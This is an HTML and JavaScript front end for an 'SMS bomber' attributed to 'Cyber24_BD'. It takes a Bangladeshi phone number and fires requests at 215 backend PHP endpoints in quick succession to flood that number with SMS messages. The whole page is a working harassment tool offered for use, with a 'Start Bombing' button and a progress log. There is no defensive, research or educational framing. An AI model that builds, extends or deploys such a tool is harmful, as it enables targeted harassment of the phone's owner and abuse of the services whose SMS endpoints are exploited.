<!DOCTYPE html>
<html>
<head>
    <title>Cyber24_BD Bomber</title>
    <style>
        body {
            background: #111;
            color: white;
            font-family: monospace;
            padding: 30px;
        }
        input, button {
            padding: 10px;
            font-size: 16px;
            margin: 10px;
        }
        #log {
            background: #222;
            border: 1px solid #444;
            padding: 15px;
            margin-top: 20px;
            height: 400px;
            overflow-y: scroll;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <h2> Bomber - Cyber24_BD</h2>
    <input type="text" id="phone" placeholder="Enter phone number" />
    <button onclick="startBombing()">Start Bombing</button>

    <div id="log">Waiting for input...</div>

    <script>
        function startBombing() {
            const phone = document.getElementById("phone").value;
            const log = document.getElementById("log");
            if (!/^01[3-9][0-9]{8}$/.test(phone)) {
                log.innerText = "ভুল নাম্বার দিয়েছেন! যেমন: 017XXXXXXXX";
                return;
            }

            log.innerText = ""; // Clear previous logs

            let totalApis = 215;
            let current = 1;

            function sendNext() {
                if (current > totalApis) {
                    log.innerText += "\n SMS BOMBING DONE";
                    return;
                }

                log.innerText += `SMS BOMBING ${current} চলছে...\n`;
                log.scrollTop = log.scrollHeight;

                fetch(`api/api${current}.php?phone=${phone}`)
                    .finally(() => {
                        current++;
                        setTimeout(sendNext, 100); // একটু delay রাখলাম
                    });
            }

            sendNext();
        }
    </script>
</body>
</html>
